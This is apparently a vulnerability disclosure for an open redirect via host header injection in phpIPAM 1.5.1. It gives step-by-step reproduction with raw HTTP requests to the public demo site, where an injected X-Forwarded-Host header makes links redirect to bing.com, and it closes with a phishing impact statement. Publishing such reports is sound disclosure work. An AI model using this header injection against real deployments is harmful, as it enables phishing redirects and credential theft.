# PHPIPAM-POC

## Open Redirect using Host header Injection in phpipam/phpipam

### VENDOR-GITHUB-LINK: https://github.com/phpipam/phpipam

### Vulnerability Type  - CWE-601: Open Redirect

### Affected Version : 1.5.1 

### Steps To Reproduce 

```MARKDOWN
1. Go to https://demo.phpipam.net/login/ and login using the Admin Credentials.
2. After logging into the Website, Refresh the page and intercept the request using Burpsuite and send the request to Repeater Tab, you can see the Request Below
```

```PYTHON
GET / HTTP/2
Host: demo.phpipam.net
Cookie: phpipam=ms81p8e6n32uin0ckq6pv9fdv2; table-page-size=50; __utma=27552809.2116478126.1675528133.1675528133.1675531253.2; __utmc=27552809; __utmz=27552809.1675528133.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=27552809.3.10.1675531253; __utmt=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://demo.phpipam.net/login/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

```PYTHON
3. Add a header `X-Forwarded-Host: bing.com` in the request and send the request , Below is the Modified Request
```

```PYTHON
GET / HTTP/2
Host: demo.phpipam.net
X-Forwarded-Host: bing.com
Cookie: phpipam=ms81p8e6n32uin0ckq6pv9fdv2; table-page-size=50; __utma=27552809.2116478126.1675528133.1675528133.1675531253.2; __utmc=27552809; __utmz=27552809.1675528133.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=27552809.3.10.1675531253; __utmt=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://demo.phpipam.net/login/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

```PYTHON
4. Search for the bing.com  in the Response and you will see that the path have changed to `bing.com` 
5.  Right click and select `show response in browser` , Copy the url and paste it in your browser.
6.  Now click on tab like Customers , Locations, Devices , Racks area  etc and you will be redirected to  bing.com.
```

## Proof of Concept

![POC-PHPIPAM-HOST-HEADER-INJECTION](https://github.com/ctflearner/Vulnerability/assets/98345027/dde7a84a-7504-42fa-be9b-5e4a5c292ec3)
![POC-2-PHPIPAM-HOST-HEADER-INJECTION](https://github.com/ctflearner/Vulnerability/assets/98345027/be0fac82-4d08-4c1c-b6c0-1e76d27c4819)








VIDEO-POC-LINK : [link](https://youtu.be/jPRZgt2Y0NA)

### Impact
```
If the Application does not validate untrusted user input, an attacker could supply a URL that redirects an unsuspecting victim from a legitimate domain to an attacker's phishing site and can perform different actions like stealing credentials.
```
